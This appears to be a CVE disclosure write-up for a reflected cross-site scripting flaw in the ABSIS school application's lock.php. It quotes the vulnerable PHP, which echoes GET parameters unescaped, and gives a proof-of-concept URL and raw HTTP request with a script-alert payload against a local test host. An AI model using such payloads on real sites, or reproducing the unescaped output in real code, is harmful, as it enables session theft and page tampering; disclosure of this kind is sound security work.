# CVE-2023-49029

## powered by Chiaki2333 ##

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49029

## Vulnerability link ##

https://github.com/smpn1smg/absis

## Vulnerability details ##
absis/view/main/lock/lock.php Line 5 and Line 56.

```
<?php

if (isset($_GET['nama'])){

	$nama = $_GET['nama'];
	if ($nama == ""){
		$nama = "nama ne dandani sek";
	}
} else {

	include_once "bye.php";
}

if (isset($_GET['user'])){

	$user = $_GET['user'];
} else {

	include_once "bye.php";
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta http-equiv="Cache-control" content="public">
		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
		<meta name="description" content="">
		<meta name="keywords" content="">
		<meta name="author" content="">
		<title>ABSIS | Aplikasi Akademik</title>
		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
		<link href="assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">
		<link href="assets/css/style.css" rel="stylesheet">
		<link href="assets/css/style-responsive.css" rel="stylesheet">
		<script>
		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

		  ga('create', 'UA-62650664-1', 'auto');
		  ga('send', 'pageview');
		</script>
	</head>
	<body class="login tooltips bg-info">
		<div class="login-header dark text-center">
			<img src="assets/img/logo-login.png" class="logo" alt="Logo">
		</div>
		<div class="login-wrapper">
			<form method="POST" action="hello.php">
				<div class="form-group text-center">
					<img src="assets/img/u.png" class="avatar-lock img-circle" alt="user">
				</div>
				<div class="form-group">
					<h3 class="text-center"><strong><?php echo $user?></strong></h3>
					<h4 class="text-center"><?php echo $nama?></h4>
				</div>
				<div class="form-group has-feedback lg left-feedback no-label">
				  <input type="hidden" name="username" id="username" class="form-control no-border input-lg rounded" value="<?php echo $_GET['user'];?>">
				  <span class="fa fa-user form-control-feedback"></span>
				</div>
				<div class="form-group has-feedback lg left-feedback no-label">
				  <input type="password" name="password" id="password" class="form-control no-border input-lg rounded" placeholder="Enter password" autofocus>
				  <span class="fa fa-unlock-alt form-control-feedback"></span>
				</div>
				<input type="hidden" name="redirect" value="<?php $a = str_replace("&lock","",$_SERVER["REQUEST_URI"]); echo $a;?>">
				<!-- <div class="form-group has-feedback lg left-feedback no-label">
				  <input type="password" class="form-control no-border input-lg rounded" placeholder="Enter password" autofocus>
				  <span class="fa fa-unlock form-control-feedback"></span>
				</div>
				<input type="hidden" name="redirect" value="<?php $a = str_replace("&lock","",$_SERVER["REQUEST_URI"]); echo $a;?>">
				<input type="hidden" name="username" value="<?php echo $_GET['user'];?>"> -->
				<div class="form-group">
					<button type="submit" class="btn btn-warning btn-lg btn-block">LOGIN</button>
				</div>
			</form>
			<p class="text-center"><strong><a href="bye.php">Logout</a></strong></p>
		</div>
		<script src="assets/js/jquery.min.js"></script>
		<script src="assets/js/bootstrap.min.js"></script>
		<script src="assets/plugins/retina/retina.min.js"></script>
		<script src="assets/js/apps.js"></script>
	</body>
</html>
```

`$nama` has not been filtered to cause Cross Site Scripting (XSS).

exploit

	http://127.0.0.1:81/absis/view/main/lock/lock.php?nama=XSS_TEST%3Cscript%3Ealert(%22nama_XSS%22)%3C/script%3E&user=user
    

Request

    GET /absis/view/main/lock/lock.php?nama=XSS_TEST%3Cscript%3Ealert(%22nama_XSS%22)%3C/script%3E&user=user HTTP/1.1
    Host: 127.0.0.1:81
    sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=s9lls1pte1hsph14rj2igmle37
    Connection: close
    



    
Response

![Picture of browser](https://github.com/Chiaki2333/vulnerability/blob/main/img/smpn1smg-absis-XSS-lock.php-nama-1.png)
![Picture of BurpSuite](https://github.com/Chiaki2333/vulnerability/blob/main/img/smpn1smg-absis-XSS-lock.php-nama-2.png)
